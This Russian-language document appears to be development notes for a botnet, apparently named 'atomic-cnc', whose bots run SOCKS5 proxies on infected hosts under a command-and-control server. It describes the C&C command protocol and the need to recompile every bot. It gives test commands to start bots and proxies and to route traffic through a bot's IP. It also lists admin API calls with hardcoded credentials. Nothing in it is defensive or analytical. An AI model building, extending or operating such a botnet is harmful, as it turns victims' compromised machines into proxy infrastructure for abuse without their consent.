## Ключевые технические детали

### SOCKS5 реализация

```c
// Полная поддержка SOCKS5 протокола
- Handshake (method selection)
- Authentication (optional)
- CONNECT command
- IPv4 и Domain resolution
- Data relay с select()
- Error handling
```

### Управление соединениями

```c
// Структура proxy_server
- listen_fd: слушающий сокет
- connections[100]: массив активных соединений
- mutex: thread-safe операции
- stats: агрегированная статистика
```

### C&C коммуникация

```
Bot → C&C: [2 bytes length][1 byte cmd][data]

Commands:
0x01 - CMD_PROXY_START + config
0x02 - CMD_PROXY_STOP
0x03 - CMD_PROXY_STATUS
0x05 - CMD_KEEPALIVE
```

## Совместимость

### Обратная совместимость: НЕТ

- Старые боты не будут работать с новым C&C
- Необходима перекомпиляция всех ботов
- База данных требует миграции

### Конфигурация: ДА

- `server.toml` не требует изменений
- Порты остались прежними
- Система аутентификации совместима

## Тестирование

### Что нужно проверить

1. **Компиляция:**
   ```bash
   ./build.sh
   cd cnc && go build
   ```

2. **Подключение ботов:**
   ```bash
   # Запустить C&C
   ./atomic-cnc
   
   # Запустить тестового бота
   ./release/debug.dbg
   ```

3. **Запуск прокси:**
   ```bash
   # В админ панели
   proxy start port=1080
   proxy list
   ```

4. **Тест прокси:**
   ```bash
   curl -x socks5://bot-ip:1080 https://api.ipify.org
   ```

5. **API тесты:**
   ```bash
   curl "http://localhost:81/proxies?user=root&password=root@123"
   curl "http://localhost:81/proxy/stats?user=root&password=root@123"
   ```

## Потенциальные проблемы

### При компиляции

```
Ошибка: undefined reference to pthread_create
Решение: добавить -lpthread в build.sh (уже добавлено)
```

### При запуске

```
Ошибка: cannot bind to port 1080
Решение: требуются права root или использовать порт >1024
```

### В работе

```
Проблема: прокси не отвечают
Проверить: firewall, порты, статус бота в 'bots'
```
